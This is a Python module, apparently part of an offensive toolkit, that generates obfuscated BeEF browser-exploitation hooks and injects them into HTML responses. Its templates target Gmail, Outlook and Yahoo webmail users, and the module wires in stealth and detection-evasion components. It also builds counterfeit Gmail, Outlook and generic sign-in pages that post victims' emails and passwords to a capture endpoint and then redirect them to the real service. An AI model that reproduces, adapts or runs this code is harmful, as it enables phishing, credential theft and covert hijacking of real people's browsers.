"""
Dynamic Hook Injection Engine
Inject BeEF hooks into web pages for browser exploitation
"""

import os
import json
import base64
import secrets
import time
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import re
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class HookInjectionConfig:
    """Hook injection configuration"""

    def __init__(self):
        self.beef_hook_url = os.getenv("BEEF_HOOK_URL", "http://localhost:3000/hook.js")
        self.injection_timeout = int(os.getenv("HOOK_INJECTION_TIMEOUT", "30"))
        self.max_injection_attempts = int(os.getenv("MAX_INJECTION_ATTEMPTS", "3"))
        self.enable_obfuscation = os.getenv("ENABLE_HOOK_OBFUSCATION", "true").lower() == "true"
        self.enable_domain_whitelist = os.getenv("ENABLE_DOMAIN_WHITELIST", "true").lower() == "true"
        self.allowed_domains = os.getenv("ALLOWED_INJECTION_DOMAINS", "gmail.com,yahoo.com,outlook.com").split(",")
        self.injection_cache_duration = int(os.getenv("INJECTION_CACHE_DURATION", "3600"))

class HookTemplate:
    """Hook injection template"""

    def __init__(self, template_id: str, name: str, description: str, template_code: str):
        self.template_id = template_id
        self.name = name
        self.description = description
        self.template_code = template_code
        self.created_at = datetime.now(timezone.utc)

    def generate_hook(self, victim_id: str, session_id: str, custom_params: Dict[str, Any] = None) -> str:
        """Generate hook code from template"""
        try:
            # Replace template variables
            hook_code = self.template_code

            # Basic replacements
            replacements = {
                "{{VICTIM_ID}}": victim_id,
                "{{SESSION_ID}}": session_id,
                "{{HOOK_URL}}": self._get_hook_url(),
                "{{TIMESTAMP}}": str(int(time.time())),
                "{{RANDOM_ID}}": secrets.token_hex(8)
            }

            # Add custom parameters
            if custom_params:
                for key, value in custom_params.items():
                    replacements[f"{{{{{key}}}}}"] = str(value)

            # Apply replacements
            for placeholder, value in replacements.items():
                hook_code = hook_code.replace(placeholder, value)

            # Apply obfuscation if enabled
            if self._is_obfuscation_enabled():
                hook_code = self._obfuscate_hook(hook_code)

            return hook_code

        except Exception as e:
            logger.error(f"Error generating hook: {e}")
            return ""

    def _get_hook_url(self) -> str:
        """Get BeEF hook URL"""
        return os.getenv("BEEF_HOOK_URL", "http://localhost:3000/hook.js")

    def _is_obfuscation_enabled(self) -> bool:
        """Check if obfuscation is enabled"""
        return os.getenv("ENABLE_HOOK_OBFUSCATION", "true").lower() == "true"

    def _obfuscate_hook(self, hook_code: str) -> str:
        """Obfuscate hook code"""
        try:
            # Simple obfuscation techniques
            obfuscated = hook_code

            # Replace variable names with random strings
            var_pattern = r'\bvar\s+(\w+)'
            variables = re.findall(var_pattern, obfuscated)

            for var in variables:
                random_name = secrets.token_hex(4)
                obfuscated = re.sub(r'\b' + var + r'\b', random_name, obfuscated)

            # Add junk code
            junk_lines = [
                f"var {secrets.token_hex(4)} = {secrets.token_hex(2)};",
                f"if ({secrets.token_hex(2)}) {{}};",
                f"function {secrets.token_hex(4)}() {{ return {secrets.token_hex(2)}; }};"
            ]

            # Insert junk code at random positions
            lines = obfuscated.split('\n')
            for junk in junk_lines:
                if len(lines) > 5:
                    insert_pos = secrets.randbelow(len(lines) - 1)
                    lines.insert(insert_pos, junk)

            return '\n'.join(lines)

        except Exception as e:
            logger.error(f"Error obfuscating hook: {e}")
            return hook_code

class InjectionTarget:
    """Hook injection target"""

    def __init__(self, target_id: str, url: str, injection_method: str = "javascript"):
        self.target_id = target_id
        self.url = url
        self.injection_method = injection_method
        self.created_at = datetime.now(timezone.utc)

        # Injection status
        self.is_injected = False
        self.injection_attempts = 0
        self.last_injection_attempt = None
        self.injection_success_rate = 0.0

        # Target characteristics
        self.domain = self._extract_domain(url)
        self.is_whitelisted = self._check_domain_whitelist()

    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL"""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            return parsed.netloc.lower()
        except Exception:
            return ""

    def _check_domain_whitelist(self) -> bool:
        """Check if domain is whitelisted for injection"""
        if not self._is_whitelist_enabled():
            return True

        allowed_domains = os.getenv("ALLOWED_INJECTION_DOMAINS", "gmail.com,yahoo.com,outlook.com").split(",")
        return any(domain.strip() in self.domain for domain in allowed_domains)

    def _is_whitelist_enabled(self) -> bool:
        """Check if domain whitelist is enabled"""
        return os.getenv("ENABLE_DOMAIN_WHITELIST", "true").lower() == "true"

    def can_inject(self) -> bool:
        """Check if target can be injected"""
        return (self.is_whitelisted and
                self.injection_attempts < 3 and
                not self.is_injected)

    def record_injection_attempt(self, success: bool):
        """Record injection attempt"""
        self.injection_attempts += 1
        self.last_injection_attempt = datetime.now(timezone.utc)

        if success:
            self.is_injected = True
            self.injection_success_rate = self.injection_attempts / self.injection_attempts
        else:
            # Calculate success rate
            total_attempts = self.injection_attempts
            self.injection_success_rate = (self.injection_success_rate * (total_attempts - 1) + (1 if success else 0)) / total_attempts

class HookInjector:
    """Main hook injection engine"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = HookInjectionConfig()
        self.templates: Dict[str, HookTemplate] = {}
        self.targets: Dict[str, InjectionTarget] = {}
        self.injection_cache: Dict[str, str] = {}
        
        # Advanced stealth components
        self.stealth_manager = None
        self.detection_evasion = None
        self.dynamic_obfuscator = None

        # Load default templates
        self._load_default_templates()
        
        # Initialize advanced components
        self._initialize_advanced_components()

    def _initialize_advanced_components(self):
        """Initialize advanced stealth and evasion components"""
        try:
            from engines.advanced.beef_stealth_manager import BeEFStealthManager
            from engines.advanced.detection_evasion import DetectionEvasionEngine
            from engines.advanced.dynamic_obfuscator import DynamicObfuscator
            
            self.stealth_manager = BeEFStealthManager(self.mongodb, self.redis)
            self.detection_evasion = DetectionEvasionEngine(self.mongodb, self.redis)
            self.dynamic_obfuscator = DynamicObfuscator(self.mongodb, self.redis)
            
            logger.info("Advanced BeEF components initialized")
        except Exception as e:
            logger.error(f"Error initializing advanced components: {e}")

    def _load_default_templates(self):
        """Load default hook templates"""
        try:
            # Gmail injection template
            gmail_template = HookTemplate(
                "gmail_basic",
                "Gmail Basic Hook",
                "Basic hook injection for Gmail",
                """
                // Gmail Hook Injection
                (function() {
                    'use strict';

                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    var hookUrl = '{{HOOK_URL}}';
                    var timestamp = '{{TIMESTAMP}}';

                    // Create hook script element
                    var script = document.createElement('script');
                    script.src = hookUrl + '?victim_id=' + victimId + '&session_id=' + sessionId;
                    script.async = true;

                    // Add to head
                    var head = document.head || document.getElementsByTagName('head')[0];
                    if (head) {
                        head.appendChild(script);
                    }

                    // Track injection
                    if (typeof window.beefHookInjected === 'undefined') {
                        window.beefHookInjected = true;
                        console.log('BeEF hook injected for victim: ' + victimId);
                    }
                })();
                """
            )

            # Generic web page template
            generic_template = HookTemplate(
                "generic_web",
                "Generic Web Hook",
                "Generic hook injection for web pages",
                """
                // Generic Web Hook Injection
                (function() {
                    'use strict';

                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';
                    var hookUrl = '{{HOOK_URL}}';

                    // Wait for page load
                    if (document.readyState === 'loading') {
                        document.addEventListener('DOMContentLoaded', function() {
                            injectHook();
                        });
                    } else {
                        injectHook();
                    }

                    function injectHook() {
                        // Check if already injected
                        if (window.beefSessionId === sessionId) {
                            return;
                        }

                        // Create hook script
                        var script = document.createElement('script');
                        script.src = hookUrl + '?v=' + victimId + '&s=' + sessionId;
                        script.onload = function() {
                            window.beefSessionId = sessionId;
                            console.log('BeEF hook loaded for session: ' + sessionId);
                        };

                        // Inject script
                        (document.head || document.body || document.documentElement).appendChild(script);
                    }
                })();
                """
            )

            # Email-specific template
            email_template = HookTemplate(
                "email_client",
                "Email Client Hook",
                "Hook injection for email clients",
                """
                // Email Client Hook Injection
                (function() {
                    'use strict';

                    var victimId = '{{VICTIM_ID}}';
                    var sessionId = '{{SESSION_ID}}';

                    // Detect email client
                    var isGmail = /mail\.google\.com/.test(window.location.href);
                    var isOutlook = /outlook\.live\.com/.test(window.location.href);
                    var isYahoo = /mail\.yahoo\.com/.test(window.location.href);

                    if (isGmail || isOutlook || isYahoo) {
                        // Email client specific injection
                        setTimeout(function() {
                            var script = document.createElement('script');
                            script.src = '{{HOOK_URL}}' + '?victim=' + victimId + '&session=' + sessionId;
                            script.setAttribute('data-victim-id', victimId);

                            // Find appropriate injection point
                            var targetElement = document.querySelector('head') || document.body;
                            if (targetElement) {
                                targetElement.appendChild(script);
                            }
                        }, 2000); // Wait 2 seconds for email client to load
                    }
                })();
                """
            )

            self.templates = {
                "gmail_basic": gmail_template,
                "generic_web": generic_template,
                "email_client": email_template
            }

            logger.info(f"Loaded {len(self.templates)} hook templates")

        except Exception as e:
            logger.error(f"Error loading default templates: {e}")

    def create_injection_target(self, url: str, injection_method: str = "javascript") -> str:
        """
        Create injection target

        Args:
            url: Target URL
            injection_method: Injection method

        Returns:
            Target ID
        """
        try:
            target_id = secrets.token_hex(16)

            target = InjectionTarget(target_id, url, injection_method)
            self.targets[target_id] = target

            logger.info(f"Injection target created: {target_id} for URL: {url}")
            return target_id

        except Exception as e:
            logger.error(f"Error creating injection target: {e}")
            return ""

    def generate_hook_script(self, victim_id: str, target_url: str = None,
                           template_id: str = "generic_web", custom_params: Dict[str, Any] = None) -> str:
        """
        Generate hook injection script with advanced stealth features

        Args:
            victim_id: Victim identifier
            target_url: Target URL for injection
            template_id: Hook template to use
            custom_params: Custom template parameters

        Returns:
            Generated hook script
        """
        try:
            # Get template
            if template_id not in self.templates:
                logger.error(f"Template not found: {template_id}")
                return ""

            template = self.templates[template_id]

            # Generate session ID
            session_id = secrets.token_hex(16)

            # Generate base hook script
            hook_script = template.generate_hook(victim_id, session_id, custom_params)

            # Apply advanced stealth features if available
            if self.stealth_manager and self.detection_evasion and self.dynamic_obfuscator:
                # Apply stealth techniques
                hook_script = self.stealth_manager.apply_stealth_techniques(hook_script, victim_id)
                
                # Apply detection evasion
                hook_script = self.detection_evasion.evade_detection(hook_script, target_url)
                
                # Apply dynamic obfuscation
                hook_script = self.dynamic_obfuscator.obfuscate_code(hook_script, victim_id)

            # Cache generated script
            cache_key = f"hook_{victim_id}_{session_id}"
            self.injection_cache[cache_key] = hook_script

            logger.info(f"Advanced hook script generated for victim: {victim_id} using template: {template_id}")
            return hook_script

        except Exception as e:
            logger.error(f"Error generating hook script: {e}")
            return ""

    def inject_hook_into_response(self, original_response: str, victim_id: str,
                                injection_point: str = "body_end") -> str:
        """
        Inject hook into HTML response

        Args:
            original_response: Original HTML response
            victim_id: Victim identifier
            injection_point: Where to inject (head_start, body_start, body_end)

        Returns:
            Modified response with hook
        """
        try:
            # Generate hook script
            hook_script = self.generate_hook_script(victim_id)

            if not hook_script:
                return original_response

            # Wrap hook in script tags
            script_tag = f"<script>\n{hook_script}\n</script>"

            # Find injection point
            if injection_point == "head_start":
                # Inject at beginning of head
                head_match = re.search(r'<head[^>]*>', original_response, re.IGNORECASE)
                if head_match:
                    insert_pos = head_match.end()
                    return original_response[:insert_pos] + "\n" + script_tag + original_response[insert_pos:]

            elif injection_point == "body_start":
                # Inject at beginning of body
                body_match = re.search(r'<body[^>]*>', original_response, re.IGNORECASE)
                if body_match:
                    insert_pos = body_match.end()
                    return original_response[:insert_pos] + "\n" + script_tag + original_response[insert_pos:]

            else:  # body_end
                # Inject at end of body
                body_end_match = re.search(r'</body>', original_response, re.IGNORECASE)
                if body_end_match:
                    insert_pos = body_end_match.start()
                    return original_response[:insert_pos] + "\n" + script_tag + original_response[insert_pos:]

                # If no body tag, inject at end of HTML
                html_end_match = re.search(r'</html>', original_response, re.IGNORECASE)
                if html_end_match:
                    insert_pos = html_end_match.start()
                    return original_response[:insert_pos] + "\n" + script_tag + original_response[insert_pos:]

            # If no injection point found, return original
            logger.warning(f"No injection point found for victim: {victim_id}")
            return original_response

        except Exception as e:
            logger.error(f"Error injecting hook into response: {e}")
            return original_response

    def create_phishing_page(self, victim_id: str, target_service: str = "gmail",
                           redirect_url: str = None) -> Dict[str, Any]:
        """
        Create phishing page with hook injection

        Args:
            victim_id: Victim identifier
            target_service: Target service (gmail, outlook, etc.)
            redirect_url: URL to redirect after exploitation

        Returns:
            Phishing page data
        """
        try:
            # Generate phishing page based on target service
            if target_service.lower() == "gmail":
                phishing_html = self._create_gmail_phishing_page(victim_id, redirect_url)
            elif target_service.lower() == "outlook":
                phishing_html = self._create_outlook_phishing_page(victim_id, redirect_url)
            else:
                phishing_html = self._create_generic_phishing_page(victim_id, target_service, redirect_url)

            # Inject hook
            hooked_html = self.inject_hook_into_response(phishing_html, victim_id)

            return {
                "success": True,
                "victim_id": victim_id,
                "target_service": target_service,
                "html_content": hooked_html,
                "page_size": len(hooked_html.encode()),
                "created_at": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error creating phishing page: {e}")
            return {"success": False, "error": "Failed to create phishing page"}

    def _create_gmail_phishing_page(self, victim_id: str, redirect_url: str = None) -> str:
        """Create Gmail phishing page"""
        try:
            redirect = redirect_url or "https://mail.google.com"

            html = f"""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Gmail</title>
                <style>
                    body {{
                        font-family: arial,sans-serif;
                        margin: 0;
                        padding: 0;
                        background: #fff;
                    }}
                    .gmail-container {{
                        max-width: 450px;
                        margin: 0 auto;
                        padding: 20px;
                        text-align: center;
                    }}
                    .gmail-logo {{
                        margin-bottom: 20px;
                    }}
                    .login-form {{
                        border: 1px solid #ddd;
                        border-radius: 8px;
                        padding: 20px;
                        background: #f9f9f9;
                    }}
                    .form-group {{
                        margin-bottom: 15px;
                    }}
                    input[type="email"], input[type="password"] {{
                        width: 100%;
                        padding: 12px;
                        border: 1px solid #ddd;
                        border-radius: 4px;
                        font-size: 16px;
                        box-sizing: border-box;
                    }}
                    .btn {{
                        width: 100%;
                        padding: 12px;
                        background: #4285f4;
                        color: white;
                        border: none;
                        border-radius: 4px;
                        font-size: 16px;
                        cursor: pointer;
                    }}
                    .btn:hover {{
                        background: #3367d6;
                    }}
                </style>
            </head>
            <body>
                <div class="gmail-container">
                    <div class="gmail-logo">
                        <svg width="75" height="24" viewBox="0 0 75 24" fill="none">
                            <path d="M9.5 3h-9C.2 3 0 3.2 0 3.5v13C0 16.8.2 17 0.5 17h9c.3 0 .5-.2.5-.5v-13c0-.3-.2-.5-.5-.5z" fill="#EA4335"/>
                            <path d="M38.5 3h-9c-.3 0-.5.2-.5.5v13c0 .3.2.5.5.5h9c.3 0 .5-.2.5-.5v-13c0-.3-.2-.5-.5-.5z" fill="#FBBC05"/>
                            <path d="M67.5 3h-9c-.3 0-.5.2-.5.5v13c0 .3.2.5.5.5h9c.3 0 .5-.2.5-.5v-13c0-.3-.2-.5-.5-.5z" fill="#34A853"/>
                            <path d="M24 3h19v2H24V3z" fill="#EA4335"/>
                            <path d="M53 13h19v2H53v-2z" fill="#34A853"/>
                        </svg>
                    </div>

                    <div class="login-form">
                        <h2>Sign in</h2>
                        <p>Use your Google Account</p>

                        <form id="loginForm">
                            <div class="form-group">
                                <input type="email" id="email" placeholder="Email or phone" required>
                            </div>

                            <div class="form-group">
                                <input type="password" id="password" placeholder="Enter your password" required>
                            </div>

                            <button type="submit" class="btn">Next</button>
                        </form>

                        <div style="margin-top: 20px; font-size: 12px; color: #666;">
                            <a href="#">Forgot password?</a> |
                            <a href="#">Create account</a>
                        </div>
                    </div>
                </div>

                <script>
                    document.getElementById('loginForm').addEventListener('submit', function(e) {{
                        e.preventDefault();

                        var email = document.getElementById('email').value;
                        var password = document.getElementById('password').value;

                        // Send credentials to capture endpoint
                        fetch('/api/capture/credentials', {{
                            method: 'POST',
                            headers: {{
                                'Content-Type': 'application/json',
                            }},
                            body: JSON.stringify({{
                                victim_id: '{victim_id}',
                                email: email,
                                password: password,
                                service: 'gmail',
                                url: window.location.href
                            }})
                        }}).then(function() {{
                            // Redirect to real Gmail
                            window.location.href = '{redirect}';
                        }}).catch(function(error) {{
                            console.error('Error:', error);
                            window.location.href = '{redirect}';
                        }});
                    }});
                </script>
            </body>
            </html>
            """

            return html

        except Exception as e:
            logger.error(f"Error creating Gmail phishing page: {e}")
            return ""

    def _create_outlook_phishing_page(self, victim_id: str, redirect_url: str = None) -> str:
        """Create Outlook phishing page"""
        try:
            redirect = redirect_url or "https://outlook.live.com"

            html = f"""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Outlook - Sign In</title>
                <style>
                    body {{
                        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                        margin: 0;
                        padding: 0;
                        background: #f3f2f1;
                    }}
                    .outlook-container {{
                        max-width: 400px;
                        margin: 40px auto;
                        background: white;
                        border-radius: 8px;
                        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
                    }}
                    .outlook-header {{
                        text-align: center;
                        padding: 20px;
                        border-bottom: 1px solid #eee;
                    }}
                    .outlook-logo {{
                        font-size: 24px;
                        font-weight: bold;
                        color: #0078d4;
                    }}
                    .login-form {{
                        padding: 20px;
                    }}
                    .form-group {{
                        margin-bottom: 20px;
                    }}
                    input[type="email"], input[type="password"] {{
                        width: 100%;
                        padding: 12px;
                        border: 2px solid #ddd;
                        border-radius: 4px;
                        font-size: 16px;
                        box-sizing: border-box;
                    }}
                    input:focus {{
                        outline: none;
                        border-color: #0078d4;
                    }}
                    .btn {{
                        width: 100%;
                        padding: 12px;
                        background: #0078d4;
                        color: white;
                        border: none;
                        border-radius: 4px;
                        font-size: 16px;
                        cursor: pointer;
                    }}
                    .btn:hover {{
                        background: #106ebe;
                    }}
                </style>
            </head>
            <body>
                <div class="outlook-container">
                    <div class="outlook-header">
                        <div class="outlook-logo">Outlook</div>
                        <p>Sign in to your account</p>
                    </div>

                    <div class="login-form">
                        <form id="loginForm">
                            <div class="form-group">
                                <input type="email" id="email" placeholder="Email, phone, or Skype" required>
                            </div>

                            <div class="form-group">
                                <input type="password" id="password" placeholder="Password" required>
                            </div>

                            <button type="submit" class="btn">Sign in</button>
                        </form>

                        <div style="margin-top: 20px; font-size: 14px; text-align: center;">
                            <a href="#">Can't access your account?</a>
                        </div>
                    </div>
                </div>

                <script>
                    document.getElementById('loginForm').addEventListener('submit', function(e) {{
                        e.preventDefault();

                        var email = document.getElementById('email').value;
                        var password = document.getElementById('password').value;

                        // Send credentials to capture endpoint
                        fetch('/api/capture/credentials', {{
                            method: 'POST',
                            headers: {{
                                'Content-Type': 'application/json',
                            }},
                            body: JSON.stringify({{
                                victim_id: '{victim_id}',
                                email: email,
                                password: password,
                                service: 'outlook',
                                url: window.location.href
                            }})
                        }}).then(function() {{
                            window.location.href = '{redirect}';
                        }}).catch(function(error) {{
                            console.error('Error:', error);
                            window.location.href = '{redirect}';
                        }});
                    }});
                </script>
            </body>
            </html>
            """

            return html

        except Exception as e:
            logger.error(f"Error creating Outlook phishing page: {e}")
            return ""

    def _create_generic_phishing_page(self, victim_id: str, service: str, redirect_url: str = None) -> str:
        """Create generic phishing page"""
        try:
            redirect = redirect_url or f"https://{service}.com"

            html = f"""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>{service.title()} - Sign In</title>
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        margin: 0;
                        padding: 0;
                        background: #f5f5f5;
                    }}
                    .container {{
                        max-width: 400px;
                        margin: 50px auto;
                        background: white;
                        border-radius: 8px;
                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                        overflow: hidden;
                    }}
                    .header {{
                        background: #333;
                        color: white;
                        padding: 20px;
                        text-align: center;
                    }}
                    .form-container {{
                        padding: 30px;
                    }}
                    .form-group {{
                        margin-bottom: 20px;
                    }}
                    input {{
                        width: 100%;
                        padding: 12px;
                        border: 1px solid #ddd;
                        border-radius: 4px;
                        font-size: 16px;
                        box-sizing: border-box;
                    }}
                    .btn {{
                        width: 100%;
                        padding: 12px;
                        background: #007bff;
                        color: white;
                        border: none;
                        border-radius: 4px;
                        font-size: 16px;
                        cursor: pointer;
                    }}
                    .btn:hover {{
                        background: #0056b3;
                    }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h2>{service.title()} Login</h2>
                    </div>

                    <div class="form-container">
                        <form id="loginForm">
                            <div class="form-group">
                                <input type="text" id="username" placeholder="Username or Email" required>
                            </div>

                            <div class="form-group">
                                <input type="password" id="password" placeholder="Password" required>
                            </div>

                            <button type="submit" class="btn">Sign In</button>
                        </form>
                    </div>
                </div>

                <script>
                    document.getElementById('loginForm').addEventListener('submit', function(e) {{
                        e.preventDefault();

                        var username = document.getElementById('username').value;
                        var password = document.getElementById('password').value;

                        // Send credentials to capture endpoint
                        fetch('/api/capture/credentials', {{
                            method: 'POST',
                            headers: {{
                                'Content-Type': 'application/json',
                            }},
                            body: JSON.stringify({{
                                victim_id: '{victim_id}',
                                username: username,
                                password: password,
                                service: '{service}',
                                url: window.location.href
                            }})
                        }}).then(function() {{
                            window.location.href = '{redirect}';
                        }}).catch(function(error) {{
                            console.error('Error:', error);
                            window.location.href = '{redirect}';
                        }});
                    }});
                </script>
            </body>
            </html>
            """

            return html

        except Exception as e:
            logger.error(f"Error creating generic phishing page: {e}")
            return ""

    def get_injection_statistics(self) -> Dict[str, Any]:
        """Get injection statistics"""
        try:
            total_targets = len(self.targets)
            injected_targets = sum(1 for target in self.targets.values() if target.is_injected)
            total_attempts = sum(target.injection_attempts for target in self.targets.values())

            # Success rate
            success_rate = (injected_targets / total_targets * 100) if total_targets > 0 else 0

            # Template usage
            template_usage = {}
            for template_id in self.templates.keys():
                template_usage[template_id] = 0

            # This would need to track actual template usage in real implementation

            return {
                "total_targets": total_targets,
                "injected_targets": injected_targets,
                "total_attempts": total_attempts,
                "success_rate": success_rate,
                "cache_size": len(self.injection_cache),
                "available_templates": list(self.templates.keys()),
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting injection statistics: {e}")
            return {"error": "Failed to get statistics"}

# Global hook injector instance
hook_injector = None

def initialize_hook_injector(mongodb_connection=None, redis_client=None) -> HookInjector:
    """Initialize global hook injector"""
    global hook_injector
    hook_injector = HookInjector(mongodb_connection, redis_client)
    
    # Initialize advanced components
    try:
        from engines.advanced.beef_stealth_manager import initialize_stealth_manager
        from engines.advanced.detection_evasion import initialize_evasion_engine
        from engines.advanced.dynamic_obfuscator import initialize_obfuscator
        
        initialize_stealth_manager(mongodb_connection, redis_client)
        initialize_evasion_engine(mongodb_connection, redis_client)
        initialize_obfuscator(mongodb_connection, redis_client)
        
        logger.info("Advanced BeEF components initialized")
    except Exception as e:
        logger.error(f"Error initializing advanced components: {e}")
    
    return hook_injector

def get_hook_injector() -> HookInjector:
    """Get global hook injector"""
    if hook_injector is None:
        raise ValueError("Hook injector not initialized")
    return hook_injector

# Convenience functions
def generate_hook_script(victim_id: str, target_url: str = None, template_id: str = "generic_web",
                        custom_params: Dict[str, Any] = None) -> str:
    """Generate hook script (global convenience function)"""
    return get_hook_injector().generate_hook_script(victim_id, target_url, template_id, custom_params)

def inject_hook_into_response(original_response: str, victim_id: str, injection_point: str = "body_end") -> str:
    """Inject hook into response (global convenience function)"""
    return get_hook_injector().inject_hook_into_response(original_response, victim_id, injection_point)

def create_phishing_page(victim_id: str, target_service: str = "gmail", redirect_url: str = None) -> Dict[str, Any]:
    """Create phishing page (global convenience function)"""
    return get_hook_injector().create_phishing_page(victim_id, target_service, redirect_url)

def get_injection_statistics() -> Dict[str, Any]:
    """Get injection statistics (global convenience function)"""
    return get_hook_injector().get_injection_statistics()